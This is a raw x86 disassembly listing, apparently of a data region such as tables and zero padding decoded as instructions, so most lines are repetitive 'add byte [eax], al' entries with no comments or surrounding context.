add byte [eax], al
pop es
or eax, 0xd0a0000
add byte [eax], al
or eax, 0x1000000d
or eax, 0xd130000
add byte [eax], al
push ss
or eax, 0xd190000
add byte [eax], al
sbb al, 0xd
add byte [eax], al
pop ds
or eax, 0xd220000
add byte [eax], al
and eax, 0x2800000d
or eax, 0xd2b0000
add byte [eax], al
or eax, 0xd310000
add byte [eax], al
xor al, 0xd
add byte [eax], al
aaa
or eax, 0xd3a0000
add byte [eax], al
cmp eax, 0x4000000d
or eax, 0xd430000
add byte [eax], al
inc esi
or eax, 0xd490000
add byte [eax], al
dec esp
or eax, 0xd4f0000
add byte [eax], al
push edx
or eax, 0xd550000
add byte [eax], al
pop eax
or eax, 0xd5b0000
add byte [eax], al
pop esi
or eax, 0xd610000
add byte [eax], al
or eax, 0xd670000
add byte [eax], al
push 0xd
add byte [eax], al
insd dword es:[edi], dx
or eax, 0xd700000
add byte [eax], al
jae 0x80993a7
add byte [eax], al
jbe 0x80993ab
add byte [eax], al
jns 0x80993af
add byte [eax], al
jl 0x80993b3
add byte [eax], al
jg 0x80993b7
add byte [eax], al
or byte [0xd850000], 0
add byte [eax - 0x74fffff3], cl
or eax, 0xd8e0000
add byte [eax], al
xchg ecx, eax
or eax, 0xd940000
add byte [eax], al
xchg edi, eax
or eax, 0xd9a0000
add byte [eax], al
popfd
or eax, 0xda00000
add byte [eax], al
mov dword [0xa600000d], eax
or eax, 0xda90000
add byte [eax], al
lodsb al, byte [esi]
or eax, 0xdaf0000
add byte [eax], al
mov dl, 0xd
add byte [eax], al
mov ch, 0xd
add byte [eax], al
mov eax, 0xbb00000d
or eax, 0xdbe0000
add byte [eax], al
ror dword [0xdc40000], 0
add bh, al
or eax, 0xdca0000
add byte [eax], al
int 0xd
add byte [eax], al
ror byte [0xdd30000], 1
add byte [eax], al
salc
or eax, 0xdd90000
add byte [eax], al
fmul qword [0xddf0000]
add byte [eax], al
loop 0x809943b
add byte [eax], al
in eax, 0xd
add byte [eax], al
call 0xf3099446
or eax, 0xdee0000
add byte [eax], al
int1
or eax, 0xdf40000
add byte [eax], al
test dword [0xdfa0000], 0xdfd0000
add byte [eax], al
add byte [esi], cl
add byte [eax], al
add ecx, dword [esi]
add byte [eax], al
push es
push cs
add byte [eax], al
or dword [esi], ecx
add byte [eax], al
or al, 0xe
add byte [eax], al
femms
add byte [eax], al
adc cl, byte [esi]
add byte [eax], al
adc eax, 0x1800000e
push cs
add byte [eax], al
sbb ecx, dword [esi]
add byte [eax], al
push ds
push cs
add byte [eax], al
and dword [esi], ecx
add byte [eax], al
and al, 0xe
add byte [eax], al
daa
push cs
add byte [eax], al
sub cl, byte [esi]
add byte [eax], al
sub eax, 0x3000000e
push cs
add byte [eax], al
xor ecx, dword [esi]
add byte [eax], al
push cs
add byte [eax], al
cmp dword [esi], ecx
add byte [eax], al
cmp al, 0xe
add byte [eax], al
aas
push cs
add byte [eax], al
inc edx
push cs
add byte [eax], al
inc ebp
push cs
add byte [eax], al
dec eax
push cs
add byte [eax], al
dec ebx
push cs
add byte [eax], al
dec esi
push cs
add byte [eax], al
push ecx
push cs
add byte [eax], al
push esp
push cs
add byte [eax], al
push edi
push cs
add byte [eax], al
pop edx
push cs
add byte [eax], al
pop ebp
push cs
add byte [eax], al
pushal
push cs
add byte [eax], al
arpl word [esi], cx
add byte [eax], al
push cs
add byte [eax], al
imul ecx, dword [esi], 0xe6c0000
add byte [eax], al
outsd dx, dword [esi]
push cs
add byte [eax], al
jb 0x80994fc
add byte [eax], al
jne 0x8099500
add byte [eax], al
js 0x8099504
add byte [eax], al
jnp 0x8099508
add byte [eax], al
jle 0x809950c
add byte [eax], al
or dword [esi], 0xe840000
add byte [eax], al
xchg dword [esi], ecx
add byte [eax], al
mov cl, byte [esi]
add byte [eax], al
lea ecx, [esi]
add byte [eax], al
nop
push cs
add byte [eax], al
xchg ebx, eax
push cs
add byte [eax], al
xchg esi, eax
push cs
add byte [eax], al
cdq
push cs
add byte [eax], al
pushfd
push cs
add byte [eax], al
lahf
push cs
add byte [eax], al
mov byte [0xa500000e], al
push cs
add byte [eax], al
test al, 0xe
add byte [eax], al
stosd dword es:[edi], eax
push cs
add byte [eax], al
scasb al, byte es:[edi]
push cs
add byte [eax], al
mov cl, 0xe
add byte [eax], al
mov ah, 0xe
add byte [eax], al
mov bh, 0xe
add byte [eax], al
mov edx, 0xbd00000e
push cs
add byte [eax], al
ror byte [esi], 0
add bl, al
push cs
add byte [eax], al
invalid
push cs
add byte [eax], al
leave
push cs
add byte [eax], al
int3
push cs
add byte [eax], al
iretd
push cs
add byte [eax], al
ror byte [esi], cl
add byte [eax], al
aad 0xe
add byte [eax], al
fmul dword [esi]
add byte [eax], al
fisttp dword [esi]
add byte [eax], al
fimul word [esi]
add byte [eax], al
loope 0x8099590
add byte [eax], al
in al, 0xe
add byte [eax], al
out 0xe, eax
add byte [eax], al
ljmp 0xe:0xed00000e
add al, dh
push cs
add byte [eax], al
push cs
add byte [eax], al
test byte [esi], 0
add cl, bh
push cs
add byte [eax], al
cld
push cs
add byte [eax], al
dec dword [esi]
add byte [eax], al
add cl, byte [edi]
add byte [eax], al
add eax, 0x800000f
sldt word [eax]
or ecx, dword [edi]
add byte [eax], al
push cs
sldt word [eax]
adc dword [edi], ecx
add byte [eax], al
adc al, 0xf
add byte [eax], al
pop ss
sldt word [eax]
sbb cl, byte [edi]
add byte [eax], al
sbb eax, 0x2000000f
sldt word [eax]
and ecx, dword [edi]
add byte [eax], al
sldt word es:[eax]
sub dword [edi], ecx
add byte [eax], al
sub al, 0xf
add byte [eax], al
das
sldt word [eax]
xor cl, byte [edi]
add byte [eax], al
xor eax, 0x3800000f
sldt word [eax]
cmp ecx, dword [edi]
add byte [eax], al
sldt word ds:[eax]
inc ecx
sldt word [eax]
inc esp
sldt word [eax]
inc edi
sldt word [eax]
dec edx
sldt word [eax]
dec ebp
sldt word [eax]
push eax
sldt word [eax]
push ebx
sldt word [eax]
push esi
sldt word [eax]
pop ecx
sldt word [eax]
pop esp
sldt word [eax]
pop edi
sldt word [eax]
bound ecx, qword [edi]
add byte [eax], al
sldt word gs:[eax]
push 0x6b00000f
sldt word [eax]
outsb dx, byte [esi]
sldt word [eax]
jno 0x8099651
add byte [eax], al
je 0x8099655
add byte [eax], al
ja 0x8099659
add byte [eax], al
jp 0x809965d
add byte [eax], al
jge 0x8099661
add byte [eax], al
or byte [edi], 0
add byte [ebx - 0x79fffff1], al
sldt word [eax]
mov dword [edi], ecx
add byte [eax], al
mov word [edi], cs
add byte [eax], al
invalid
sldt word [eax]
xchg edx, eax
sldt word [eax]
xchg ebp, eax
sldt word [eax]
cwde
sldt word [eax]
wait
sldt word [eax]
sahf
sldt word [eax]
mov eax, dword [0xa400000f]
sldt word [eax]
cmpsd dword [esi], dword ptr es:[edi]
sldt word [eax]
stosb byte es:[edi], al
sldt word [eax]
lodsd eax, dword [esi]
sldt word [eax]
mov al, 0xf
add byte [eax], al
mov bl, 0xf
add byte [eax], al
mov dh, 0xf
add byte [eax], al
mov ecx, 0xbc00000f
sldt word [eax]
mov edi, 0xc200000f
sldt word [eax]
lds ecx, [edi]
add byte [eax], al
enter 0xf, 0
retf
sldt word [eax]
into
sldt word [eax]
ror dword [edi], 1
add byte [eax], al
aam 0xf
add byte [eax], al
xlatb
sldt word [eax]
fimul dword [edi]
add byte [eax], al
fisttp qword [edi]
add byte [eax], al
loopne 0x80996e5
add byte [eax], al
jecxz 0x80996e9
add byte [eax], al
out 0xf, al
add byte [eax], al
jmp 0xf40996f4
sldt word [eax]
out dx, eax
sldt word [eax]
sldt word [eax]
cmc
sldt word [eax]
clc
sldt word [eax]
sti
sldt word [eax]
dec byte [edi]
add byte [eax], al
add dword [eax], edx
add byte [eax], al
add al, 0x10
add byte [eax], al
pop es
adc byte [eax], al
add byte [edx], cl
adc byte [eax], al
add byte [0x10000010], cl
adc byte [eax], al
add byte [ebx], dl
adc byte [eax], al
add byte [esi], dl
adc byte [eax], al
add byte [ecx], bl
adc byte [eax], al
add byte [eax + edx], bl
add byte [eax], al
pop ds
adc byte [eax], al
add byte [edx], ah
adc byte [eax], al
add byte [0x28000010], ah
adc byte [eax], al
add byte [ebx], ch
adc byte [eax], al
add byte [esi], ch
adc byte [eax], al
add byte [ecx], dh
adc byte [eax], al
add byte [eax + edx], dh
add byte [eax], al
aaa
adc byte [eax], al
add byte [edx], bh
adc byte [eax], al
add byte [0x40000010], bh
adc byte [eax], al
add byte [ebx + 0x10], al
add byte [eax], al
inc esi
adc byte [eax], al
add byte [ecx + 0x10], cl
add byte [eax], al
dec esp
adc byte [eax], al
add byte [edi + 0x10], cl
add byte [eax], al
push edx
adc byte [eax], al
add byte [ebp + 0x10], dl
add byte [eax], al
pop eax
adc byte [eax], al
add byte [ebx + 0x10], bl
add byte [eax], al
pop esi
adc byte [eax], al
add byte [ecx + 0x10], ah
add byte [eax], al
adc byte fs:[eax], al
add byte [edi + 0x10], ah
add byte [eax], al
push 0x10
add byte [eax], al
insd dword es:[edi], dx
adc byte [eax], al
add byte [eax + 0x10], dh
add byte [eax], al
jae 0x80997aa
add byte [eax], al
jbe 0x80997ae
add byte [eax], al
jns 0x80997b2
add byte [eax], al
jl 0x80997b6
add byte [eax], al
jg 0x80997ba
add byte [eax], al
adc byte [eax], 0
add byte [ebp - 0x77fffff0], al
adc byte [eax], al
add byte [ebx - 0x71fffff0], cl
adc byte [eax], al
add byte [ecx - 0x6bfffff0], dl
adc byte [eax], al
add byte [edi - 0x65fffff0], dl
adc byte [eax], al
add byte [ebp - 0x5ffffff0], bl
adc byte [eax], al
add byte [ebx - 0x59fffff0], ah
adc byte [eax], al
add byte [ecx - 0x53fffff0], ch
adc byte [eax], al
add byte [edi - 0x4dfffff0], ch
adc byte [eax], al
add byte [ebp - 0x47fffff0], dh
adc byte [eax], al
add byte [ebx - 0x41fffff0], bh
adc byte [eax], al
add cl, al
adc byte [eax], al
add ah, al
adc byte [eax], al
add bh, al
adc byte [eax], al
add dl, cl
adc byte [eax], al
add ch, cl
adc byte [eax], al
add al, dl
adc byte [eax], al
add bl, dl
adc byte [eax], al
add dh, dl
adc byte [eax], al
add cl, bl
adc byte [eax], al
add ah, bl
adc byte [eax], al
add bh, bl
adc byte [eax], al
add dl, ah
adc byte [eax], al
add ch, ah
adc byte [eax], al
add al, ch
adc byte [eax], al
add bl, ch
adc byte [eax], al
add dh, ch
adc byte [eax], al
add cl, dh
adc byte [eax], al
add ah, dh
adc byte [eax], al
add bh, dh
adc byte [eax], al
add dl, bh
adc byte [eax], al
add ch, bh
adc byte [eax], al
add byte [eax], al
adc dword [eax], eax
add byte [ebx], al
adc dword [eax], eax
add byte [esi], al
adc dword [eax], eax
add byte [ecx], cl
adc dword [eax], eax
add byte [ecx + edx], cl
add byte [eax], al
movups xmmword [eax], xmm0
add byte [edx], dl
adc dword [eax], eax
add byte [0x18000011], dl
adc dword [eax], eax
add byte [ebx], bl
adc dword [eax], eax
add byte [esi], bl
adc dword [eax], eax
add byte [ecx], ah
adc dword [eax], eax
add byte [ecx + edx], ah
add byte [eax], al
daa
adc dword [eax], eax
add byte [edx], ch
adc dword [eax], eax
add byte [0x30000011], ch
adc dword [eax], eax
add byte [ebx], dh
adc dword [eax], eax
add byte [esi], dh
adc dword [eax], eax
add byte [ecx], bh
adc dword [eax], eax
add byte [ecx + edx], bh
add byte [eax], al
aas
adc dword [eax], eax
add byte [edx + 0x11], al
add byte [eax], al
inc ebp
adc dword [eax], eax
add byte [eax + 0x11], cl
add byte [eax], al
dec ebx
adc dword [eax], eax
add byte [esi + 0x11], cl
add byte [eax], al
push ecx
adc dword [eax], eax
add byte [ecx + edx], dl
add byte [edi + 0x11], dl
add byte [eax], al
pop edx
adc dword [eax], eax
add byte [ebp + 0x11], bl
add byte [eax], al
pushal
adc dword [eax], eax
add byte [ebx + 0x11], ah
add byte [eax], al
adc word [eax], ax
add byte [ecx + 0x11], ch
add byte [eax], al
insb byte es:[edi], dx
adc dword [eax], eax
add byte [edi + 0x11], ch
add byte [eax], al
jb 0x80998ff
add byte [eax], al
jne 0x8099903
add byte [eax], al
js 0x8099907
add byte [eax], al
jnp 0x809990b
add byte [eax], al
jle 0x809990f
add byte [eax], al
adc dword [ecx], 0x11840000
add byte [eax], al
xchg dword [ecx], edx
add byte [eax], al
mov dl, byte [ecx]
add byte [eax], al
lea edx, [ecx]
add byte [eax], al
nop
adc dword [eax], eax
add byte [ebx - 0x69ffffef], dl
adc dword [eax], eax
add byte [ecx - 0x63ffffef], bl
adc dword [eax], eax
add byte [edi - 0x5dffffef], bl
adc dword [eax], eax
add byte [ebp - 0x57ffffef], ah
adc dword [eax], eax
add byte [ebx - 0x51ffffef], ch
adc dword [eax], eax
add byte [ecx - 0x4bffffef], dh
adc dword [eax], eax
add byte [edi - 0x45ffffef], dh
adc dword [eax], eax
add byte [ebp - 0x3fffffef], bh
adc dword [eax], eax
add bl, al
adc dword [eax], eax
add dh, al
adc dword [eax], eax
add cl, cl
adc dword [eax], eax
add ah, cl
adc dword [eax], eax
add bh, cl
adc dword [eax], eax
add dl, dl
adc dword [eax], eax
add ch, dl
adc dword [eax], eax
add al, bl
adc dword [eax], eax
add bl, bl
adc dword [eax], eax
add dh, bl
adc dword [eax], eax
add cl, ah
adc dword [eax], eax
add ah, ah
adc dword [eax], eax
add bh, ah
adc dword [eax], eax
add dl, ch
adc dword [eax], eax
add ch, ch
adc dword [eax], eax
add al, dh
adc dword [eax], eax
add bl, dh
adc dword [eax], eax
add dh, dh
adc dword [eax], eax
add cl, bh
adc dword [eax], eax
add ah, bh
adc dword [eax], eax
add bh, bh
adc dword [eax], eax
add byte [edx], al
adc al, byte [eax]
add byte [0x8000012], al
adc al, byte [eax]
add byte [ebx], cl
adc al, byte [eax]
add byte [esi], cl
adc al, byte [eax]
add byte [ecx], dl
adc al, byte [eax]
add byte [edx + edx], dl
add byte [eax], al
pop ss
adc al, byte [eax]
add byte [edx], bl
adc al, byte [eax]
add byte [0x20000012], bl
adc al, byte [eax]
add byte [ebx], ah
adc al, byte [eax]
add byte [esi], ah
adc al, byte [eax]
add byte [ecx], ch
adc al, byte [eax]
add byte [edx + edx], ch
add byte [eax], al
das
adc al, byte [eax]
add byte [edx], dh
adc al, byte [eax]
add byte [0x38000012], dh
adc al, byte [eax]
add byte [ebx], bh
adc al, byte [eax]
add byte [esi], bh
adc al, byte [eax]
add byte [ecx + 0x12], al
add byte [eax], al
inc esp
adc al, byte [eax]
add byte [edi + 0x12], al
add byte [eax], al
dec edx
adc al, byte [eax]
add byte [ebp + 0x12], cl
add byte [eax], al
push eax
adc al, byte [eax]
add byte [ebx + 0x12], dl
add byte [eax], al
push esi
adc al, byte [eax]
add byte [ecx + 0x12], bl
add byte [eax], al
pop esp
adc al, byte [eax]
add byte [edi + 0x12], bl
add byte [eax], al
bound edx, qword [edx]
add byte [eax], al
adc al, byte gs:[eax]
add byte [eax + 0x12], ch
add byte [eax], al
imul edx, dword [edx], 0
add byte [esi + 0x12], ch
add byte [eax], al
jno 0x8099a54
add byte [eax], al
je 0x8099a58
add byte [eax], al
ja 0x8099a5c
add byte [eax], al
jp 0x8099a60
add byte [eax], al
jge 0x8099a64
add byte [eax], al
adc byte [edx], 0
add byte [ebx - 0x79ffffee], al
adc al, byte [eax]
add byte [ecx - 0x73ffffee], cl
adc al, byte [eax]
add byte [edi - 0x6dffffee], cl
adc al, byte [eax]
add byte [ebp - 0x67ffffee], dl
adc al, byte [eax]
add byte [ebx - 0x61ffffee], bl
adc al, byte [eax]
add byte [ecx - 0x5bffffee], ah
adc al, byte [eax]
add byte [edi - 0x55ffffee], ah
adc al, byte [eax]
add byte [ebp - 0x4fffffee], ch
adc al, byte [eax]
add byte [ebx - 0x49ffffee], dh
adc al, byte [eax]
add byte [eax], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [ebx], al
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
cmp al, 0
add byte [eax], al
cmp al, 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub eax, 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [edx], dl
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jne 0x8099af2
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub al, 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte ds:[eax], al
add byte [esi], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ah
and byte [eax], al
add byte [eax], al
xor dword [eax], eax
add byte [eax], al
das
add byte [eax], al
add byte [eax + eax], dh
add byte [eax], al
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
and byte [eax], al
add byte [eax], al
xor dword [eax], eax
add byte [eax], al
das
add byte [eax], al
add byte [edx], dh
add byte [eax], al
add byte [eax], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ah
and byte [eax], al
add byte [eax], al
xor eax, dword [eax]
add byte [eax], al
das
add byte [eax], al
add byte [eax + eax], dh
add byte [eax], al
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ecx
add byte [eax], al
add byte [ebp], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
js 0x8099b7e
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jae 0x8099b8a
add byte [eax], al
jae 0x8099b8e
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
popal
add byte [eax], al
add byte [ebp], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec ecx
add byte [eax], al
add byte [edx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul eax, dword [eax], 0x6a0000
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
daa
add byte [eax], al
add byte [esi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec edi
add byte [eax], al
add byte [ebp], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec edi
add byte [eax], al
add byte [ebp], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
outsd dx, dword [esi]
add byte [eax], al
add byte [ebp], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
outsd dx, dword [esi]
add byte [eax], al
add byte [ebp], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jae 0x8099c1a
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esp
add byte [eax], al
add byte [edx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esp
add byte [eax], al
add byte [edx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
insb byte es:[edi], dx
add byte [eax], al
add byte [edx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esi
add byte [eax], al
add byte [edx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esi
add byte [eax], al
add byte [edx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
outsb dx, byte [esi]
add byte [eax], al
add byte [edx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc esp
add byte [eax], al
add byte [edx], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc esp
add byte [eax], al
add byte [edx], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte fs:[eax], al
add byte [edx], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
daa
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
daa
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop edi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub eax, 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [0], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [0], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [0], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [0x2d000000], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [0], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
daa
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], ch
add byte [eax], al
sub al, 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
and al, byte [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub eax, dword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
outsd dx, dword [esi]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], ch
add byte [eax], al
add byte [esi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], ch
add byte [eax], al
add byte [esi], ch
add byte [eax], al
add byte [esi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pushal
add byte [eax], al
add byte [eax], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pushal
add byte [eax], al
add byte [eax], ah
add byte [eax], al
pushal
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte ds:[eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ah
add byte [eax], al
add byte [ecx], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], bh
add byte [eax], al
add byte [edi], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], bh
add byte [eax], al
add byte [ecx], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ah
add byte [eax], al
add byte [edi], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], dl
add byte [eax], al
jae 0x8099f2e
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ebp
add byte [eax], al
add byte [ebp], dl
add byte [eax], al
push edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ah
add byte [eax], al
das
add byte [eax], al
add byte [ebx], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
popal
add byte [eax], al
add byte [edi], ch
add byte [eax], al
add byte [ebx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ebx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], ah
add byte [eax], al
das
add byte [eax], al
add byte [edi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
arpl word [eax], ax
add byte [eax], al
das
add byte [eax], al
add byte [ebp], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [bx + si], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec ecx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esi
add byte [eax], al
add byte [edi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], dl
add byte [ebp], al
add byte [eax], al
dec esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
sub byte [eax], al
add byte [eax], al
push esp
add byte [eax], al
add byte [ebp], cl
add byte [eax], al
sub dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], cl
add byte [eax], al
push 0x6d000000
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte gs:[eax], al
add byte [eax], al
add byte [eax], al
